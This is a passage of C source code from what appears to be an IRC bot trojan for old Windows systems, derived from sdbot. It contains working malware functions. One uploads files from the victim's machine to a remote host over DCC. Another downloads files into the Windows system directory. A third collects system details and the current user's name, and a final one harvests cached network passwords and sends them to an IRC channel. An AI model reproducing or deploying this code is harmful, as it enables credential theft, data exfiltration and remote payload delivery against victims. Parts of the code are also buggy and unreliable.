	if (er == SOCKET_ERROR) {
		closesocket(Server);
		return 1;
	}
	return 0;
}


 char * rndnick(char *strbuf) //directly coppied from sdbot
 {
	int n, nl;
	char nick[12];

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	nl = (rand()%3)+4;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';

	strncpy(strbuf, nick, 12);
	return strbuf;
 }

int dccsenderror(SOCKET sock,char *chan,char *buf)
{
	char buffer[4096];
	strcat(buf,"\n\r");
	if (chan) sprintf(buffer,"PRIVMSG %s :%s",chan,buf);
	else sprintf(buffer,buf);
	send(sock,buffer,strlen(buffer),0);
	return 0;
}

 DWORD WINAPI dcc_send(LPVOID param)
{
	char buffer[4096];
	DWORD err;
   	SOCKADDR_IN    SockAddr;
   	SOCKET         dcc;
	SOCKET         sock;
	sock = dcchosts;
	char chan[50];	
	memset(chan,0,sizeof(chan));
	if (sendtochan != NULL) strcpy(chan,sendtochan);
   	IN_ADDR iaddr;
	char host[20];
	char filename[250];
	int port;
	unsigned long received2;
 	sprintf(host,dcchost);
	strcpy(filename,dccfilename);
	char sendbuf[512];  
	port = dccport;
	info = TRUE;
	FILE *infile;
	while (1) 
	{
		dcc = socket( AF_INET, SOCK_STREAM, 0);
   		if (dcc == INVALID_SOCKET) {
      			sprintf(sendbuf,"INVALID_SOCKET");
			break;
		}
   		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = htons(port);
		iaddr.s_addr = inet_addr(host);
		if (iaddr.s_addr == INADDR_NONE) { //error dns
			sprintf(sendbuf,"dns error");
			break;
		}

		SockAddr.sin_addr = iaddr; //ip address
		HANDLE testfile = CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			CloseHandle(testfile);
			sprintf(sendbuf,"No such file");
			break;
		}
		CloseHandle(testfile);
		infile = fopen(filename,"rb");
		if (infile == NULL) {
			sprintf(sendbuf,"No such file");
			break;
		}
  		err = connect( dcc, (PSOCKADDR) &SockAddr, sizeof(SockAddr));

		if (err == SOCKET_ERROR) {
			sprintf(sendbuf,"Error connecting");
			break;
		}
		int c;
		int count;
		while (1)
		{
			memset(buffer,0,sizeof(buffer));
			c = fread(buffer,1,sizeof(buffer),infile);
			if (c == 0) 
				break;
			err = send(dcc,buffer ,sizeof(buffer), 0);
			if (err == SOCKET_ERROR || err == 0) {
				fclose(infile);
				dccsenderror(sock,chan,"Socket error");
				closesocket(dcc);
				return 1;
			}
			count = count + err;
			
		}
		sprintf(sendbuf,"Transfer complete (send: %i bytes)",count);
		break;
	}
	
	dccsenderror(sock,chan,sendbuf);
	closesocket(dcc);
	fclose(infile);
        return 0;
}

 DWORD WINAPI dcc_getfile(LPVOID param)
{
	char buffer[4096];
	char sendbuffer[4096];
	DWORD err;
   	SOCKADDR_IN	SockAddr;
   	SOCKET	dcc;
	SOCKET	sock;
	sock = dcchosts;
	char chan[50];	
	memset(chan,0,sizeof(chan));
	if (sendtochan != NULL) strcpy(chan,sendtochan);
   	IN_ADDR iaddr;
	char host[20];
	int port;
	int filesize;
	int received = 0;
	unsigned long received2;
 	sprintf(host,dcchost);
	char sysdir[MAX_PATH];
	char filename[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(filename,"%s\\%s",sysdir,dccfilename);
	port = dccport;
	info = TRUE;
	FILE *infile;
	dcc = socket( AF_INET, SOCK_STREAM, 0);
	while (1) 
	{
   		if (dcc == INVALID_SOCKET) {
      			sprintf(sendbuffer,"INVALID_SOCKET");
			break;
		}
   		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = htons(port);
		iaddr.s_addr = inet_addr(host);
		if (iaddr.s_addr == INADDR_NONE) {
			sprintf(sendbuffer,"dns error");
			break;
		}

		SockAddr.sin_addr = iaddr; //ip address
		HANDLE testfile = CreateFile(filename,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			CloseHandle(testfile);
			sprintf(sendbuffer,"Error with file");
			break;
		}
		CloseHandle(testfile);
		infile = fopen(filename,"a+b");
		if (infile == NULL) {
			sprintf(sendbuffer,"Error with file");
			break;
		}
  		err = connect( dcc, (PSOCKADDR) &SockAddr, sizeof(SockAddr));

		if (err == SOCKET_ERROR) {
			sprintf(sendbuffer,"Error connecting");
			break;
		}
		err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));
			err = recv( dcc, buffer, sizeof(buffer), 0);
			if (err == 0) break;
			if (err == SOCKET_ERROR) {
				dccsenderror(sock,chan,"Socket error");
				fclose(infile);
				closesocket(dcc);
				return 1;
			}
			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  htonl(received);
			send(dcc,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuffer,"Transfer complete (size: %i bytes)",received);
		break;
	}
	if (infile != NULL) fclose(infile);
	closesocket(dcc);
	dccsenderror(sock,chan,sendbuffer);
	return 0;

}
// function used for sysinfo (thanks to sdbot)
 char * sysinfo(char *sinfo, SOCKET sock)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
        LPTSTR lpszSystemInfo="???";
        DWORD cchBuff = 256;
	SOCKADDR sa;
	int sas;
	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

        if(!GetUserName(lpszSystemInfo, &cchBuff)) lpszSystemInfo = "?";
	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);
	char ip[15];
	sprintf(ip,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	DWORD addr = inet_addr(ip);

	hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
	char hostname[250];
	if (hostent != NULL)
		sprintf(hostname,hostent->h_name);
	else sprintf(hostname,"couldn't resolve host");


	sprintf(sinfo, "cpu: %dMHz. ram: %dMB total, %dMB free. os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm. Current user: %s IP address: %s Hostname: %s",
		cpuspeed(), memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60, lpszSystemInfo,ip,hostname);

	return sinfo; // return the sysinfo string
 }

// cpu speed function
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		//  speed = ((cyclecount()-startcycle)/100000)/10;
		speed = (cyclecount() - startcycle) / 1000000; // FIXED

	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P
	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 unsigned __int64 cyclecount(void)
 {
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

 }


//get passwords only win 9x ( i think i found this source on http://www.planet-source-code.com/ but im not sure)

struct PASSWORD_CACHE_ENTRY {
	WORD cbEntry;
	WORD cbResource;
	WORD cbPassword;
	BYTE iEntry;
	BYTE nType;
	char abResource[1];
};

typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData );

DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);

typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);

ENUMPASSWORD pWNetEnumCachedPasswords;

typedef struct {
	char *pBuffer;
	int nBufLen;
	int nBufPos;
} PASSCACHECALLBACK_DATA;

BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}
int cashedpasswords(SOCKET sock,char *sendto)
{
	char sendbuf[2150];
	char start[] = "Searsing for passwords";
	HMODULE hLib=LoadLibrary("MPR.DLL");

	PASSCACHECALLBACK_DATA dat;
	dat.pBuffer=(char *)malloc(65536);
	dat.nBufLen=65536;
	dat.nBufPos=0;
	pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");
	if (!pWNetEnumCachedPasswords)	{ //only win 9x!!
		return 1;
	}
	pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);
	char *svStr;
	svStr=dat.pBuffer;
	if (sendto != NULL) sprintf(sendbuf,"PRIVMSG %s :%s\n\r",sendto,start);
	else sprintf(sendbuf,"%s\n\r",start);
	send(sock,sendbuf,strlen(sendbuf), 0);
	do {
		char *svRsc=svStr;
		svStr+=lstrlen(svStr)+1;
		char *svPwd=svStr;
		svStr+=lstrlen(svStr)+1;
		memset(sendbuf,0,sizeof(sendbuf));
		if (sendto != NULL) sprintf(sendbuf,"PRIVMSG %s :%s %s\n\r",sendto, svRsc, svPwd);
		else sprintf(sendbuf,"%s %s\n\r", svRsc, svPwd);
		send(sock,sendbuf,strlen(sendbuf), 0);
	}while(*svStr!='\0');
	FreeLibrary(hLib);
	return 0;
};


